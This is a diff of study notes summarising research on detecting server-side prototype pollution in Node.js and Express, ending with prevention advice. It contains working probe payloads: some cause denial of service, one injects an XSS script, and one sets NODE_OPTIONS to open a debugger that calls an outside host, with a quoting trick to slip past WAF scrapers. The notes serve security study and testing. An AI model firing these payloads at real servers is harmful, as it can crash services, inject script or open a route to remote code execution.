@@ -1,5 +1,7 @@
 https://portswigger.net/research/server-side-prototype-pollution
 
+Burp extension: https://github.com/portswigger/server-side-prototype-pollution
+
 
 Introduction
 - Detecting server-side prototype pollution legitimately is a huge challenge. The very nature of how it works can semi-permanently break functionality on the server
@@ -31,16 +33,405 @@ Introduction
 
 Detection methods that cause DoS:
 - Encoding:
-    {"__proto__": {"encoding": "x"}} --> Connection reset
-    + Root cause:
+    + Sink:
         if (options && options.encoding) {
             this.decoder = new StringDecoder(options.encoding);
-        //property is sent to StringDecoder containing invalid charset
+            //property is sent to StringDecoder containing invalid charset
             this.encoding = options.encoding;
         }
+    + Payload:
+        { "__proto__": { "encoding": "x" } } --> Can cause connection reset
     + In real attack, this would mean the whole app went down
 - Constructor:
     + Before: {"foo": "bar"} --> 200
     + Probe: {"constructor": {"keys": "x"}}
     + After: {"foo": "bar"} --> 500
     + This change Object.keys() to "x"
+    + Sink:
+        var params = Object.keys(parameters).sort()
+        -> Object.keys() is now a string -> throw error
+    + Technically, this is not pp because prototype wasn't polluted. But can used as a means to detect pp (cuz can modify property on global object)
+    + Still not good technique because it was destructive
+- Expect:
+    + Idea: pollute expect header, force return 417 "Expectation failed" response
+    + Problem: 417 response would show all the time (couldn't switch off because couldn't remove the polluted property)
+    + Trick to trace where the property was being read:
+        Object.defineProperty(Object.prototype, 'expect', {
+            get(){
+                console.trace("Expect!!!");
+                return 1337
+            }
+        });
+        + Object.defineProperty(obj, prop, descriptor)
+        + Instead of static value, here Gareth Heyes use dynamic value. Whenever {something}.expect is being read, this function will run
+        + Print stack trace to console
+    + Found that:
+        } else if (req.headers.expect !== undefined) {
+            handled = true;
+            ...
+        } else {
+            res.writeHead(417);
+            res.end();
+        }
+        + Because .expect was polluted to 1337 by get() function
+        -> req.headers.expect == 1337
+        -> Jump to else branch
+        -> Return 417
+    + Result:
+        + Before: {} --> 200
+        + Probe: { "__proto__": { "expect": 1337 } }
+        + After: {} --> 417
+- Request body overwrite:
+    + Goal: find a way to change response to XSS payload via pp
+    + App was using JSON response and reflecting the JSON
+        app.use(bodyParser.json({type: 'application/json'}));
+        app.post('/', function(req, res){
+            _.merge({}, req.body);
+        res.send(req.body);
+        });
+    + Normally, JSON content-type can't cause XSS (not render HTML, script, only text). However with pp, we can confuse Express to serve up HTML response
+        + This vuln relies on application using res.send(obj) and body parser with application/json content-type
+        + Pollute _body and body property -> cause Express serve HTML content-type + reflect _body property -> Stored XSS
+        + If Express think req.body is object -> application/json
+            else if req.body is string, HTML -> text/html -> XSS
+    + Before: {} --> 200, application/json
+    + Probe: { "__proto__": { "_body": true, "body": "<script>evil()" } }
+    + After: {} --> 200, text/html
+
+
+Safe detection methods for manual testers:
+- Don't want to take down server, ideally want ability to switch it on and off
+- Parameter limit:
+    + Before: ?x=1&foo=bar --> 200 foo=bar
+    + Probe: { "__proto__": { "parameterLimit": 1 } }
+    + After: ?x=1&foo=bar --> 200 foo=undefined
+    + Exress option:
+        + Set the maximum number of params allowed in query string
+        + It ignore the second param -> foo=undefined
+        + Can choose higher limit so it doesn't interfere with site functionality
+    + Problem: require reflection of param to know if you were successful -> can't make it into pp scanner
+    + Vuln in "qs" library:
+        parameterLimit: typeof opts.parameterLimit === 'number' ? opts.parameterLimit : defaults.parameterLimit,
+- Ignore query prefix:
+    + Before: ??foo=bar --> 200 foo=undefined
+    + Probe: { "__proto__": { "ignoreQueryPrefix": true } }
+    + After: ??foo=bar --> 200 foo=bar
+    + Express option:
+        + Allow to use question mark in param name and will completely ignore it
+    + Problem: require reflection of param -> can't make it into pp scanner
+    + Vuln in "qs" library:
+        ignoreQueryPrefix: opts.ignoreQueryPrefix === true,
+- Allow dots:
+    + Before: ?foo.bar=baz --> 200 foo=undefined
+    + Probe: { "__proto__": { "allowDots": true } }
+    + After: ?foo.bar=baz --> 200 foo=[object Object]
+    + Express option:
+        + Allow create objects from query string params by place dots in param name
+        + Could use it in bug chain to exploit a pp vulnerability
+    + Problem: require reflection of param -> can't make it into pp scanner
+    + Vuln in "qs" library:
+        allowDots: typeof opts.allowDots === 'undefined' ? defaults.allowDots : !!opts.allowDots,
+- Content type:
+    + Before: { "foo": "+AGIAYQBy-" } --> 200 { "foo": "+AGIAYQBy-" }
+    + Probe: { "__proto__": { "content-type": "application/json; charset=utf-7" } }
+    + After: { "foo": "+AGIAYQBy-" } --> 200 { "foo": "bar" }
+    + In early 2000s, UTF-7 was a big thing in web security
+        + It could make browser render web page with character encoding
+        + By poisoning content-type, can make Express render JSON as UTF-7 even when served with UTF-8 charset
+    + First confirm reflection was unchanged, then polluted with utf-7 charset. Then send probe, observed that it appeared unencoded in response -> success
+    + Gadget occur in body-parser:
+        function getCharset (req) {
+            try {
+                return (contentType.parse(req).parameters.charset || '').toLowerCase()
+            } catch (e) {
+                return undefined
+            }
+        }
+        read(req, res, next, parse, debug, {
+            encoding: charset,
+            inflate: inflate,
+            limit: limit,
+            verify: verify
+        })
+        + Polluted property appear in getCharset() function (parameters.charset)
+    + But Andrzej Matykiewicz pointed out that:
+        + It doesn't explain why request that explicitly set UTF-8 charset in request content-type header still get parsed using UTF-7 once we pollute the prototype
+        + content-type and charset properties appear to be derived directly from HTTP header, so why injected property is still being inherited
+        + Found that Node code is actually responsible for removing content-type from request object
+            IncomingMessage.prototype._addHeaderLine = _addHeaderLine;
+            function _addHeaderLine(field, value, dest) {
+                if (...) {
+                    ...
+                } else if (dest[field] === undefined) {
+                    // Drop duplicates
+                    dest[field] = value;
+                }
+            }
+            + Node will copy header to object dest if it is undefined
+            + But because we polluted property of Object, dest will inherit it and skip assign value from request header
+            + This is bad code, would be better to check if it's an own property using the hasOwnProperty() method
+
+
+Safe automated detection methods:
+- JSON spaces:
+    + Before: { "foo": "bar" } --> 200 {"foo": "bar"}
+    + Probe: { "__proto__": { "json spaces": 5 } }      (number or string)
+    + After: { "foo": "bar" } -->   {
+                                         "foo": "bar"
+                                    }
+    + Express option:
+        + Allow to control spacing between JSON properties
+        + Adding additional space to JSON response -> not break site functionality
+        + Don't need param reflection, just a JSON response -> can add to scanner
+    + Vuln code:
+        var spaces = app.get('json spaces');
+        app.set = function set(setting, val) {
+            if (arguments.length === 1) {
+                // app.get(setting)
+                return this.settings[setting];
+            }
+            ...
+        }
+        + It has been patched in version > 4.17.3
+- Exposed headers:
+    + Before: {} --> 200 {}
+    + Probe: { "__proto__": { "exposedHeaders": ["foo"] } }
+    + After: {} --> 200
+                    Access-Control-Expose-Headers: foo
+                    {}
+    + CORS config:
+        + Use this API to add CORS config to their JSON endpoints
+        + Allow to define which headers are returned in an Access-Control-Expose-Headers directive
+        + Header is reflected in every response
+        + Don't need reflect param -> can add to scanner
+    + Require: CORS module must be installed
+    + Vuln code:
+        function configureExposedHeaders(options) {
+            var headers = options.exposedHeaders;
+            if (!headers) {
+                return null;
+            } else if (headers.join) {
+                headers = headers.join(',');
+                // .headers is an array, so turn it into a string
+            }
+            if (headers && headers.length) {
+                return {
+                    key: 'Access-Control-Expose-Headers',
+                    value: headers
+                };
+            }
+            return null;
+        }
+- Status:
+    + Before: {,} --> 400
+    + Probe: { "__proto__": { "status": 510 } }
+    + After: {,} --> 510
+    + Using Node Invader:
+        + Found multiple properties of interest, one of them is status
+        + Don't know where it occurred -> use defineProperty() trick mentioned in "Expect method that cause DOS" to get stack trace of where it was read
+        + Allow to control a range of status codes (400 <= status code < 600)
+    + Vuln code in http-errors core module in Node:
+        function createError () {
+            //...
+            if (type === 'object' && arg instanceof Error) {
+                err = arg
+                status = err.status || err.statusCode || status
+            } else if (type === 'number' && i === 0) {
+                //...
+            } else { //... }
+            if (typeof status !== 'number' || (!statuses.message[status] && (status < 400 || status >= 600))) {
+                status = 500
+            }
+            ...
+        }
+- OPTIONS:
+    + Before: OPTIONS / HTTP/1.1  --->  200
+                                        POST,GET, HEAD
+    + Probe: { "__proto__": { "head": true } }
+    + After: OPTIONS / HTTP/1.1   --->  200
+                                        POST, GET
+    + Express option:
+        + OPTIONS method return list of allowed methods
+        + Allow to see if method was excluded from the response
+    + Vuln code in router module:
+        if (this.methods.get && !this.methods.head) {
+            methods.push('head');
+        }
+- JSON reflection:
+    + Method 1: __proto__ property with string value
+        + Probe:
+            { "__proto__": "x" } --> 200 {}
+            { "__proto__x": "x" } --> 200 { "__proto__x": "x" }
+        + After: {} --> 200 { "__proto__x": "..." }
+        + Scenario:
+            + If site is pp vuln, __proto__ property won't be reflected and string will be no-op -> doesn't produce any exception (__proto__x reflect but __proto__ is not)
+            + Otherwise, site will reflect both __proto__ and __proto__x
+        + Require: app reflect JSON keys, values that provided
+        + In example above: if key, value persist even when property is removed -> exist form of object persistence could be pp
+    + Method 2: excluded property (Lodash lib)
+        + Probe:
+            {
+                "__proto__": {
+                    "a": "test1"
+                },
+                "a": "test2",
+                "b": "test3"
+            }
+            --> 200 { "b": "test3" }
+        + If site using Lodash or similar lib has object reflection:
+            + First, try to pollute prototype with any key, then inject same key as regular own property, along with another unrelated own property key
+            + Then look for reflection of unrelated property key and if inherited property is not reflected -> strong indication vuln to pp
+        + Vuln code in Lodash:
+            function assignMergeValue(object, key, value) {
+                if ((value !== undefined && !eq(object[key], value)) || (value === undefined && !(key in object))) {
+                    baseAssignValue(object, key, value);
+                }
+            }
+            + Because global Object prototype is polluted -> return false for !(key in object) -> not assign value -> not reflect
+            + Lodash think 'a' already exist -> not assign value -> not reflect
+- Immutable prototype:
+    + There was a post by Paul Gerste that found pp in Blitz framework
+        https://www.sonarsource.com/blog/blitzjs-prototype-pollution/
+        + How it worked: a property in JSON referring to a path somewhere
+            {  
+                "meta": {  
+                    "params": {  
+                        "referentialEqualities": {  
+                            "products.0.brand.name": ["__proto__.targetKey"]  
+                        }
+                    },  
+                    "json": {  
+                        "products": [{"brand":{"name":"targetValue"}}]  
+                    },
+                }
+            }
+            + products.0.brand.name: refer to a path
+            + When path is found, value from stated path is assigned to value in array that declared the path
+                + SOURCE path = "products.0.brand.name"
+                    -> json.products[0].brand.name = "targetValue"
+                + DESTINATION path = ["__proto__.targetKey"] 
+                    -> Object.prototype.targetKey = "targetValue"
+            + Referential equalities:
+    + Generic way:
+        ({}).__proto__.__proto__ = {}   // throws exception
+        ({}).__proto__.__proto__ = "x"  // no operation
+        + Prototype property is immutable prototype object:
+            + Prototype of Object is null -> can't change
+            + {} -> try to change -> throw exception
+            + "x" is primitive string -> ignore, no operation, nothing happen
+        + When assign prototype with a primitive (such as string) -> no operation since prototype has to be an object
+        + For example above, replace referentialEqualities by:
+            "products.0.brand.name": ["__proto__.__proto__"]
+            + This will traverse to prototype of it and return
+                HTTP/1.1 500 Internal Server Error
+                {"message": "Immutable prototype object cannot have their prototype set"}
+- OAST: (Out-of-band Application Security Testing)
+    + Paper about how to exploit Node sinks: fork(), exec(), execSync(),...
+        https://arxiv.org/pdf/2207.11171
+    + Goal: create reliable method to detect asynchronously when sink not reflect in response
+    + Pattern:
+        + Using asynchronous technique as base -> could reliably create DNS interaction if vuln sink was used anywhere on the app
+            https://portswigger.net/research/hunting-asynchronous-vulnerabilities
+        + Payload work in multiple NodeJS sink that cause DNS interaction:
+            {
+                "__proto__": {
+                    "argv0":"node",
+                    "shell":"node",
+                    "NODE_OPTIONS":"--inspect=id.oastify.com"
+                }
+            }
+            + shell/argv0: options that sink (such as exec, spawn, fork) read to decide what child process run as
+                + pollute = "node" -> Force child process run as node (not default shell)
+                + Because NODE_OPTIONS only affect node process
+            + --inspect=<host>: node read it when startup -> open debugger port -> can connect via devtool -> node resolve DNS -> DNS interaction
+            + Act as both detect pp sink and open connect to RCE via devtool
+    + Problem: false positive, because WAF scrape hostname in request then call them itself
+        -> Fake DNS hit (WAF call, not app)
+    + Solution: obfuscate host, must work on every OS (Mac, Win, Linux)
+        + ${} and single quotes failed on Window
+        + Double quotes "" works on every OS
+            "NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"
+            + WAF scraper: see " not a valid hostname pattern -> won't scrape -> avoid false positive
+            + OS parser: strip empty "" -> real DNS
+
+
+Detecting JavaScript engines:
+- Questions:
+    + What happen if used valid JavaScript properties in parameters?
+    + Can you leak code?
+    + Can you detect what JavaScript engine they are using?
+- Idea: send JS built-in function such as constructor, toString, valueOf as param
+    + If lucky, it will access object via name that you provided -> return info
+- Example:
+    + In Adobe:
+        GET / HTTP/2
+        Host: creative.adobe.com
+        Cookie: creative-cloud-loc=constructor
+        ------------
+        HTTP/1.1 200 OK
+        Set-cookie: creative-cloud-language=function
+        Object(){[native code]}; ...
+        + Something like someObject[cookieValue] = someObject["constructor"] was happen
+        + After that if reflect in response, will print Object constructor native code
+    + Other app:
+        GET /?valueOf HTTP/2
+        --------
+        HTTP/2 500 Internal Server Error
+
+        GET /?toString HTTP/2
+        --------
+        HTTP/2 500 Internal Server Error
+- Detect method:
+    + Probe with some built-in function: toString/valueOf/hasOwnProperty
+    + Compare response with fake function like xtoString/xvalueOf/xhasOwnProperty
+    + If result in different behaviour -> assume site is using JS
+    + If web using Rhino -> Look for specific property like toSource/__iterator__
+
+
+Debugging Node applications:
+- Require: source code (white box) - test app inlocal to detect pp
+- Flag:
+    + --inspect: app run immediately
+    + --inspect-brk: pause at startup, wait for you connect first (useful when need debug happen at startup or before connect dev tool)
+        + Allow step through code when application is first executed
+- Test Node app by using --inspect or --inspect-brk flags:
+    + Run app with flag -> debugger port will be opened 
+    + Visit chrome://inspect, click link under Remote Target
+    + Connect using Chrome devtool
+    -> Could debug server-side just like client-side by using breakpoint, watch, ....
+- Purpose: use these flag + getter/console.trace + custom Node Invader to find which property are read, which are pollutable (detect gadget)
+
+
+Preventing server-side prototype pollution:
+- Use Map/Set:
+    + These provide safe API for looking up properties that do not inherit from Object prototype
+    + Example:
+        let options = new Map();
+        options.set('foo', 'bar');
+        console.log(options.get('foo'))//bar
+
+        let allowedTags = new Set();
+        allowedTags.add('b');
+        if(allowedTags.has('b')) {
+            //...
+        }
+- Deleting __proto__:
+    + Node offers a way to remove __proto__ property completely (although won't prevent pp entirely since still can perform attack using constructor.prototype)
+    + Use it by supplying command line flag "--disable-proto=delete"
+- Null prototype:
+    + If have to use regular object, need to ensure it uses null prototype
+    + Initial object using: Object.create(null)
+    + If you have to use an object literal, then use like this:
+        let optionsObject = {__proto__:null};
+
+
+Conclusion:
+- Safe black-box detection of pp is possible by using subtle differences in server behaviour
+
+
+Reference:
+- Olivier Arteau's paper: https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf
+- By Mikhail Shcherbakov, Musard Balliu & Cristian-Alexandru Staicu: https://arxiv.org/pdf/2207.11171
+- Paul Gerste's post: https://www.sonarsource.com/blog/blitzjs-prototype-pollution/
+- Daniel's post: https://www.intruder.io/research/server-side-prototype-pollution
+- Yeswehack's blog: https://www.yeswehack.com/blog
